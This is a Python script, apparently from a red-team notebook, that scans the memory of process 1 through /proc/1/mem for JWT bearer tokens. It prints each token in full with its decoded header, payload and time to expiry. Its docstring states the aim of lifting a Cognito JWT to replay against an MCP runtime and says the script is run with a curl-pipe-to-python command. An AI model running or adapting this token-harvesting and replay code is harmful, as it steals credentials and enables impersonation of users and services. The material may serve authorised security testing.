"""Extract full JWT bytes from PID 1's heap, with header+payload pre-decoded.

Notebook 14 §4.5 uses this to lift the inbound Cognito JWT for replay against
the MCP runtime. Looks for any 3-part JWT (header.payload.signature) where
both header and payload start with 'eyJ' (base64-encoded JSON object), printing:
  - the full token bytes (between JWT_BEGIN/JWT_END markers)
  - the base64url-decoded header JSON (algorithm, key id)
  - the base64url-decoded payload JSON (issuer, subject, expiry, etc.)
  - the time-until-expiry (computed against the harness's clock)

Pre-decoding here so the notebook side doesn't have to re-implement base64url +
JSON parse logic; the notebook just regex-extracts the JSON blocks and uses
them directly.

Hosted at github.com/nivmorabin/skills/dict-walk/pid1_jwt_extract.py and
fetched via `curl -sL <url> | python3` from the harness shell.
"""
import base64
import json
import re
import time


# Strict 3-part JWT: header (eyJ...) + . + payload (eyJ...) + . + signature.
# Both header and payload must start with eyJ (i.e., the base64-encoded leading
# brace `{` of a JSON object). Signature is just base64url chars (no trailing `.`).
JWT_RE = re.compile(rb'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+')


def _b64url_decode(part: str) -> bytes:
    """Base64url-decode with the trailing `=` padding many JWT serializers omit."""
    pad = '=' * (-len(part) % 4)
    return base64.urlsafe_b64decode(part + pad)


def _decode_jwt(jwt_str: str):
    """Return (header_dict, payload_dict) or (None, None) on parse failure."""
    parts = jwt_str.split('.')
    if len(parts) != 3:
        return None, None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        return header, payload
    except Exception:
        return None, None


def main():
    regions = []
    with open('/proc/1/maps', 'r') as f:
        for line in f:
            parts = line.split()
            if len(parts) < 5:
                continue
            addr_range, perms = parts[0], parts[1]
            path = parts[5] if len(parts) >= 6 else ''
            if not perms.startswith('rw-'):
                continue
            if path:
                continue
            try:
                start_s, end_s = addr_range.split('-')
                start = int(start_s, 16)
                end = int(end_s, 16)
            except Exception:
                continue
            regions.append((start, end))

    print(f'WRITABLE_PRIVATE_ANON_REGIONS={len(regions)}')

    uniques = {}
    with open('/proc/1/mem', 'rb') as mem:
        for start, end in regions:
            try:
                mem.seek(start)
                chunk = mem.read(end - start)
            except Exception:
                continue
            for m in JWT_RE.finditer(chunk):
                jwt_bytes = m.group(0)
                # Skip very short matches that aren't real JWTs (e.g. random data
                # that happened to contain 'eyJ.eyJ.x'). Real Cognito JWTs are 1KB+.
                if len(jwt_bytes) < 200:
                    continue
                if jwt_bytes not in uniques:
                    uniques[jwt_bytes] = [hex(start), 0]
                uniques[jwt_bytes][1] += 1

    print(f'UNIQUE_JWTS_FOUND={len(uniques)}')

    now = int(time.time())
    print(f'CURRENT_EPOCH={now}')

    for i, (jwt_bytes, meta) in enumerate(uniques.items()):
        va, count = meta
        jwt_str = jwt_bytes.decode('ascii', errors='replace')
        header, payload = _decode_jwt(jwt_str)

        # Computed convenience fields.
        decoded = {
            'header': header,
            'payload': payload,
            'va_first_seen': va,
            'occurrences': count,
            'len': len(jwt_bytes),
        }
        if payload and isinstance(payload.get('exp'), int):
            decoded['seconds_until_expiry'] = payload['exp'] - now
            decoded['is_expired'] = payload['exp'] <= now
        if payload and isinstance(payload.get('iss'), str):
            decoded['is_cognito'] = 'cognito-idp' in payload['iss']

        print(f'JWT_BEGIN[{i}]')
        print(f'JWT_TOKEN={jwt_str}')
        print(f'JWT_DECODED={json.dumps(decoded, default=str)}')
        print(f'JWT_END[{i}]')


if __name__ == '__main__':
    main()
